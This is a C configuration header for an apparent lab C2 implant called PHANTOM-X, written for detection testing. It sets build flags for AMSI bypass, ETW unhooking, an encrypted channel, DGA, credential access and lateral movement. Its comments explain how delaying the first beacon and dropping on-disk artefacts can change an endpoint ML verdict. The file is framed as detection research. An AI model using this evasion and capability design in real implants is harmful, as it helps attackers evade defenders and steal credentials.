/* ================================================================== */
/* PHANTOM-X :: build-time variant configuration                        */
/* ================================================================== */
/*                                                                        */
/* Every capability in this file is OFF by default. The baseline build   */
/* is what the lab measures first, and it must stay reproducible, so     */
/* the default has to be the plain one.                                  */
/*                                                                        */
/* The variants exist to answer questions, not to be impressive:         */
/*                                                                        */
/*   PX_OBFUSCATE   how much detection depends on a plaintext string?    */
/*   PX_AMSI_BYPASS does Defender's script scanning contribute to        */
/*                  fileless detection, or is it all behavioural?        */
/*   PX_ETW_UNHOOK  if a detection only works because ETW is intact,     */
/*                  how fragile is it? unhook ETW and find out.           */
/*   PX_ENCRYPT     which network detections are plaintext-signature     */
/*                  based? encrypt the channel and find out.             */
/*   PX_DGA         does the C2 detection rely on one fixed address?    */
/*                                                                        */
/* And two capabilities that are about the payload's SCOPE rather than   */
/* its visibility:                                                      */
/*                                                                        */
/*   PX_CRED_ACCESS   demonstrates credential access on the lab VM       */
/*   PX_LATERAL       demonstrates lateral movement to a second lab host */
/*                                                                        */
/* Each variant is measured against the baseline arm. The difference in */
/* the telemetry IS the result.                                          */
/*                                                                        */
/* BUILD                                                                   */
/*     Baseline:  (nothing)                                             */
/*     Variant:   /DPX_OBFUSCATE=1 /DPX_AMSI_BYPASS=1 ...               */
/*                                                                        */
/* Every flag can be combined. The fully-combined build is the "worst   */
/* case" arm that a defender has to be able to catch, and it is the     */
/* one the detection rules are finally validated against.               */
/* ================================================================== */

#ifndef PX_CONFIG_H
#define PX_CONFIG_H

#include <stddef.h>

/* --- visibility variants ------------------------------------------- */
#ifndef PX_OBFUSCATE
#define PX_OBFUSCATE 0
#endif

#ifndef PX_AMSI_BYPASS
#define PX_AMSI_BYPASS 0
#endif

#ifndef PX_ETW_UNHOOK
#define PX_ETW_UNHOOK 0
#endif

#ifndef PX_ENCRYPT
#define PX_ENCRYPT 0
#endif

#ifndef PX_DGA
#define PX_DGA 0
#endif

#ifndef PX_RESILIENT
#define PX_RESILIENT 0
#endif

/* --- scope variants -------------------------------------------------- */
#ifndef PX_CRED_ACCESS
#define PX_CRED_ACCESS 0
#endif

#ifndef PX_LATERAL
#define PX_LATERAL 0
#endif

#ifndef PX_FILE_TRANSFER
#define PX_FILE_TRANSFER 0
#endif

#ifndef PX_SCREENSHOT
#define PX_SCREENSHOT 0
#endif

#ifndef PX_CAPABILITIES
#define PX_CAPABILITIES 0
#endif

/* The stealth flag.
 *
 * WHAT IT TURNS OFF
 *     Three things the payload does that have nothing to do with talking
 *     to the C2:
 *
 *       1. the marker file written next to the image at startup
 *       2. the log file written next to the image on every line
 *       3. the immediate first connection
 *
 * WHY
 *     The endpoint's machine-learning verdict on this payload arrives
 *     at EXECUTION, not at build time. What it sees first is a fresh
 *     unsigned binary that immediately creates two text files next to
 *     itself and then opens a socket to an unusual port. That is a
 *     textbook trojan opening move, and no amount of string encoding
 *     changes it -- the strings are not what the engine is reading.
 *
 *     So the measurement is: turn the artefacts off, delay the
 *     connection, and see whether the verdict changes. If it does, the
 *     artefact was the trigger. If it does not, the trigger is the
 *     behaviour and the answer is a different technique.
 *
 *     THAT IS THE LAB'S METHOD APPLIED TO THE LAB'S OWN TOOLING: one
 *     variable at a time, and the result recorded either way.
 *
 * WHAT IT DOES NOT DO
 *     It does not remove a single technique from the capability
 *     library. The rules still have behaviour to match, because the
 *     behaviour is still there -- it is just quieter.
 */
#ifndef PX_STEALTH
#define PX_STEALTH 0
#endif

/* Seconds to wait before the FIRST connection attempt.
 *
 * Only meaningful with PX_STEALTH. The delay blurs the "process
 * started and immediately phoned home" shape, which is the other half
 * of what the machine-learning engine is reading.
 */
#ifndef PX_STEALTH_DELAY
#define PX_STEALTH_DELAY 0
#endif

/* ================================================================== */
/* The report the payload sends to the C2 server at startup.            */
/* ================================================================== */
/*                                                                       */
/* The server needs to know which arm it is talking to, otherwise the   */
/* audit log cannot distinguish a baseline run from a variant run, and   */
/* the comparison between them is impossible.                             */
/*                                                                       */
/* This is sent as a CAPS line immediately after HELLO.                  */
/*                                                                       */
/* The bitmask:                                                           */
/*   0x01  obfuscated strings                                           */
/*   0x02  AMSI bypass applied                                           */
/*   0x04  ETW unhooked                                                  */
/*   0x08  encrypted channel                                             */
/*   0x10  domain generation                                             */
/*   0x20  credential access capability present                          */
/*   0x40  lateral movement capability present                           */
/* ================================================================== */
#define PX_CAP_OBFUSCATED  0x01
#define PX_CAP_AMSI        0x02
#define PX_CAP_ETW         0x04
#define PX_CAP_ENCRYPTED   0x08
#define PX_CAP_DGA         0x10
#define PX_CAP_CRED        0x20
#define PX_CAP_LATERAL     0x40
/*   0x80  the technique capability library is compiled in               */
#define PX_CAP_LIBRARY     0x80

#define PX_CAP_MASK                                                     \
    ((PX_OBFUSCATE    ? PX_CAP_OBFUSCATED  : 0) |                              \
     (PX_AMSI_BYPASS  ? PX_CAP_AMSI        : 0) |                              \
     (PX_ETW_UNHOOK   ? PX_CAP_ETW         : 0) |                              \
     (PX_ENCRYPT      ? PX_CAP_ENCRYPTED   : 0) |                              \
     (PX_DGA          ? PX_CAP_DGA         : 0) |                              \
     (PX_CRED_ACCESS  ? PX_CAP_CRED        : 0) |                              \
     (PX_LATERAL      ? PX_CAP_LATERAL     : 0) |                              \
     (PX_CAPABILITIES ? PX_CAP_LIBRARY     : 0))

/* ================================================================== */
/* Encryption                                                           */
/* ================================================================== */
/*                                                                       */
/* The channel cipher is XOR with a keystream derived from a key. The    */
/* key is shared out of band: PX_C2_KEY in the environment, or the      */
/* compiled-in default.                                                  */
/*                                                                       */
/* This is deliberately NOT cryptography in the security sense. It is    */
/* there to answer one question -- which network detections are keyed    */
/* on plaintext -- and it must be simple enough that the lab's own      */
/* traffic analyser can decode it to check the answer.                   */
/*                                                                       */
/* The keystream is a rolling XOR against a key schedule, reset at the  */
/* start of each direction. Both ends derive it identically, which is    */
/* what makes the traffic analysable rather than merely opaque.         */
/* ================================================================== */
#define PX_XOR_KEY_LEN 32

#ifndef PX_DEFAULT_XOR_KEY
#define PX_DEFAULT_XOR_KEY "phantomx-lab-key-0123456789abcdef"
#endif

/* The largest protocol line the payload sends or receives.
 *
 * A file transfer puts a base64 chunk in one line: 16KB of raw bytes
 * becomes about 22KB of base64. Every line buffer has to be able to
 * hold that, and the encrypted arm's frame buffer has to hold the line
 * plus its four-byte length prefix.
 *
 * The limit is not arbitrary: it is what the C2 server accepts as a
 * frame (1 MiB), so the payload can never produce a frame the server
 * would refuse. */
#ifndef PX_MAX_LINE
#define PX_MAX_LINE (64 * 1024)
#endif

/* ================================================================== */
/* Domain generation                                                    */
/* ================================================================== */
/*                                                                       */
/* The DGA produces a hostname from a seed that changes daily. The      */
/* lab's DNS server (a small helper in phase5_network) generates the    */
/* same names, so the lab can resolve them without a real DNS server.    */
/*                                                                       */
/* The point is to measure whether the C2 detection depends on a single */
/* fixed address. If it does, that is a finding about the detection.    */
/* ================================================================== */
#ifndef PX_DGA_DOMAIN
#define PX_DGA_DOMAIN "pxlab"
#endif

#ifndef PX_DGA_TLD
#define PX_DGA_TLD ".lab.test"
#endif

/* ================================================================== */
/* Capability commands                                                  */
/* ================================================================== */
/*                                                                       */
/* The C2 protocol gains two verbs, both present only in the builds    */
/* that have the matching capability:                                   */
/*                                                                       */
/*   CRED|<cmd_id>            collect credentials from the lab VM       */
/*   LATERAL|<cmd_id>|<host>  move to a second lab host                 */
/*                                                                       */
/* A baseline payload receives these verbs and reports that it does not */
/* support them, rather than silently ignoring them. That difference    */
/* is itself observable, which is the point.                             */
/* ================================================================== */
#define PX_MAX_SCRATCH 4096

#endif /* PX_CONFIG_H */
